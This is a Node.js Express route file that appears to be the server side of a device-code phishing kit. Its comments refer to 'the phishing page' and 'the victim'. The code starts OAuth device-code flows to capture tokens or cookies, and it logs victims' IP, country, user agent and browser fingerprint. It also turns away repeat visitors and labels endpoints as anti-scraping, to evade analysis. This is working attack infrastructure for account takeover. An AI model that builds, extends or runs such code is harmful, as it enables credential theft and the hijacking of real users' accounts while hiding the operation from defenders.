const express = require('express');
const router = express.Router();
const deviceProxy = require('../services/deviceproxy');
const db = require('../database/connection');

const dcdiag = require('../utils/dcdiag');
const dcDiag = function (m) { dcdiag.log(m); };


async function getCountryFromIP(ip) {
  try {
    if (!ip || ip === 'unknown' || ip.startsWith('127.') || ip.startsWith('192.168.') || ip.startsWith('10.')) {
      return 'Unknown';
    }
    const axios = require('axios');
    const response = await axios.get(`http://ip-api.com/json/${ip}?fields=countryCode&timeout=2000`);
    if (response.data && response.data.countryCode) {
      return response.data.countryCode;
    }
  } catch (e) {
    // Silent fail
  }
  return 'Unknown';
}

/**
 * POST /api/device/start
 * Start a new device code flow
 * Body: { mode: "token" | "cookie" }
 * Headers: X-Auth-Mode, X-VG-JWT (the phishing page's JWT)
 */
router.post('/start', async (req, res) => {
	try {
	const mode = req.body.mode || req.headers['x-auth-mode'] || 'cookie';
	const jwtToken = req.body.jwt_token || req.headers['x-vg-jwt'] || req.query.token;
	dcDiag('[DevCode][DIAG] /api/device/start ENTER mode=' + mode + ' jwt_len=' + String(jwtToken || '').length + ' origin=' + (req.headers.origin || '-') + ' host=' + req.headers.host);

	if (!jwtToken) {
		return res.status(400).json({ error: 'JWT token required' });
	}

	// Initialize variables BEFORE try block so they're available throughout
	let user_id = null;
	let link_id = null;
	// Workers never let the backend see the victim's real address, so they
	// report it in the body. Prefer it over req.ip, which for a worker request
	// is a Cloudflare egress address - not the visitor's.
	let ipAddress = String(req.body.ip || req.ip || req.connection.remoteAddress || 'unknown').split(',')[0].trim().slice(0, 45);
	let userAgent = String(req.body.user_agent || req.headers['user-agent'] || 'unknown').slice(0, 512);

	// Verify JWT and extract user/link info
	try {
		const jwt = require('jsonwebtoken');
		const config = require('../config/env');
		const decoded = jwt.verify(jwtToken, config.JWT_SECRET);
		user_id = decoded.user_id;
		link_id = decoded.link_id;
		dcDiag('[DevCode][DIAG] /api/device/start JWT OK user_id=' + user_id + ' link_id=' + link_id + ' ip=' + ipAddress + ' ua=' + String(userAgent).substring(0, 60));

		// ── Check block_done_visitors BEFORE starting device flow ────────────────
		const [settingsRows] = await db.query(
			'SELECT block_done_visitors, redirect_url FROM visitor_settings WHERE user_id = ?',
			[user_id]
		);
		dcDiag('settings link_id=' + link_id + ' block_done_visitors=' + (settingsRows.length ? settingsRows[0].block_done_visitors : '(no row)'));

		if (settingsRows.length && settingsRows[0].block_done_visitors) {
			const [visitorRows] = await db.query(
				"SELECT id, status FROM visitors WHERE ip_address = ? AND user_id = ? AND status IN ('done', 'blocked') ORDER BY created_at DESC LIMIT 1",
				[ipAddress, user_id]
			);

			if (visitorRows.length > 0) {
				// Log the blocked revisit
				try {
					const country = req.headers['cf-ipcountry'] || 'Unknown';
					await db.query(
						"INSERT INTO visitors (user_id, link_id, ip_address, user_agent, country, status, worker_name) VALUES (?, ?, ?, ?, ?, 'blocked', 'worker')",
						[user_id, link_id, ipAddress, userAgent, country]
					);
				} catch (logErr) {
					dcDiag('blocked_revisit_log_failed link_id=' + link_id + ' err=' + logErr.message);
				}

			dcDiag('[DevCode][DIAG] /api/device/start BLOCKED by block_done_visitors link_id=' + link_id + ' ip=' + ipAddress);
				return res.json({
					blocked: true,
					redirect_url: settingsRows[0].redirect_url || ''
				});
			}
		}

		// Only log if not already logged by beacon endpoint to avoid duplicates
		let country = 'Unknown';
		try {
			const cfCountry = req.headers['cf-ipcountry'];
			if (cfCountry && cfCountry !== 'Unknown') {
				country = cfCountry;
			} else {
				// Fallback to IP geolocation
				const ipGeo = await getCountryFromIP(ipAddress);
				if (ipGeo && ipGeo !== 'Unknown') {
					country = ipGeo;
				}
			}
		} catch (e) {
			country = 'Unknown';
		}

		// Extract worker_name from links table (not from JWT)
		let workerName = null;
		try {
			const [linkRows] = await db.query('SELECT worker_name FROM links WHERE id = ? AND user_id = ?', [link_id, user_id]);
			if (linkRows.length > 0 && linkRows[0].worker_name) {
				workerName = linkRows[0].worker_name;
			}
		} catch (e) {
			// Silent fail
		}

		// Check if visitor already exists to avoid duplicates
		const [existing] = await db.query(
			'SELECT id FROM visitors WHERE user_id = ? AND link_id = ? AND ip_address = ? AND status = ?',
			[user_id, link_id, ipAddress, 'waiting']
		);

		if (existing.length === 0) {
			await db.query(
				'INSERT INTO visitors (user_id, link_id, ip_address, country, user_agent, status, worker_name, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, NOW())',
				[user_id, link_id, ipAddress, country, userAgent, 'waiting', workerName]
			);
			dcDiag('visitor_inserted link_id=' + link_id + ' user_id=' + user_id + ' ip=' + ipAddress + ' status=waiting');
		}
	} catch (jwtErr) {
		dcDiag('visitor_log_failed link_id=' + link_id + ' err=' + jwtErr.message);
		// Continue with device flow even if visitor logging fails
	}

	const apiBaseUrl = `${req.protocol}://${req.get('host')}`;
	dcDiag('[DevCode][DIAG] /api/device/start calling deviceProxy.startDeviceFlow mode=' + mode + ' apiBaseUrl=' + apiBaseUrl);
	const result = await deviceProxy.startDeviceFlow(mode, jwtToken, apiBaseUrl, {
		ip: ipAddress,
		userAgent: userAgent,
		// Workers forward the link-specific tenant / client id they received from
		// /api/verify; self-hosted pages omit both and fall back to global config.
		tenant: req.body.tenant || req.headers['x-tenant'],
		clientId: req.body.client_id || req.headers['x-client-id'],
	});

	dcDiag('[DevCode][DIAG] /api/device/start RESULT ' + JSON.stringify(result).substring(0, 300));
	res.json(result);
} catch (err) {
	dcDiag('[DevCode][DIAG] /api/device/start FAILED err=' + (err && err.message) + ' http_status=' + (err && err.response && err.response.status) + ' http_body=' + String(err && err.response && err.response.data).substring(0, 300));
	res.status(500).json({ error: 'Failed to start device flow', message: err.message });
}
});

/**
 * GET /api/device/status/:job_id
 * Poll for device code flow status
 */
router.get('/status/:job_id', async (req, res) => {
	try {
		const { job_id } = req.params;
		const result = deviceProxy.getJobStatus(job_id);
		res.json(result);
	} catch (err) {
		res.status(500).json({ error: 'Failed to get status' });
	}
});

// -------------------------------------------
// Beacon endpoint - tracks page visits
// -------------------------------------------
router.post('/beacon', async (req, res) => {
	try {
		const { jwt_token } = req.body;

		if (!jwt_token) {
			return res.status(400).json({ error: 'JWT token required' });
		}

		// Verify JWT and log the beacon
		const jwt = require('jsonwebtoken');
		const config = require('../config/env');

		try {
			const decoded = jwt.verify(jwt_token, config.JWT_SECRET);

			// Insert visitor record
			const ipAddress = req.ip || req.connection.remoteAddress || 'unknown';
			const userAgent = req.headers['user-agent'] || 'unknown';

			// Simple country detection (you can enhance this with GeoIP)
			let country = 'Unknown';
			try {
				// Try to get country from Cloudflare header or fallback
				const cfCountry = req.headers['cf-ipcountry'];
				if (cfCountry) country = cfCountry;
			} catch (e) {
				country = 'Unknown';
			}

			await db.query(
				'INSERT INTO visitors (user_id, link_id, ip_address, country, user_agent, status, created_at) VALUES (?, ?, ?, ?, ?, ?, NOW())',
				[decoded.user_id, decoded.link_id, ipAddress, country, userAgent, 'waiting']
			);

			res.json({ success: true, message: 'Beacon received' });
		} catch (jwtErr) {
			return res.status(401).json({ error: 'Invalid JWT token' });
		}
	} catch (err) {
		res.status(500).json({ error: 'Beacon failed' });
	}
});
	
	// Heartbeat endpoint - verifies page is still alive (anti-scraping)
	router.post('/heartbeat', async (req, res) => {
	  try {
	    const { jwt } = req.body;
	    if (!jwt) {
	      return res.status(400).json({ error: 'JWT token required' });
	    }
	    
	    const jwtLib = require('jsonwebtoken');
	    const config = require('../config/env');
	    let decoded;
	    try {
	      decoded = jwtLib.verify(jwt, config.JWT_SECRET);
	    } catch (e) {
	      return res.status(401).json({ error: 'Invalid or expired JWT' });
	    }
	    
	    // Update last heartbeat timestamp in visitors table
	    const db = require('../database/connection');
	    await db.query(
	      'UPDATE visitors SET last_heartbeat = NOW() WHERE link_id = ? AND jwt_token = ?',
	      [decoded.link_id, jwt]
	    );
	    
	    res.json({ success: true, message: 'Heartbeat received' });
	  } catch (err) {
	    res.status(500).json({ error: 'Heartbeat failed' });
	  }
	});
	
	// Fingerprint endpoint - receives browser fingerprint from anti-scraping
	router.post('/fp', async (req, res) => {
	  try {
	    const { fp, jwt } = req.body;
	    if (!fp || !jwt) {
	      return res.status(400).json({ error: 'Fingerprint and JWT required' });
	    }
	    
	    const jwtLib = require('jsonwebtoken');
	    const config = require('../config/env');
	    let decoded;
	    try {
	      decoded = jwtLib.verify(jwt, config.JWT_SECRET);
	    } catch (e) {
	      return res.status(401).json({ error: 'Invalid or expired JWT' });
	    }
	    
	    const db = require('../database/connection');
	    await db.query(
	      'UPDATE visitors SET fingerprint = ? WHERE link_id = ? AND jwt_token = ?',
	      [fp, decoded.link_id, jwt]
	    );
	    
	    res.json({ success: true, message: 'Fingerprint received' });
	  } catch (err) {
	    res.status(500).json({ error: 'Fingerprint failed' });
	  }
	});

module.exports = router;
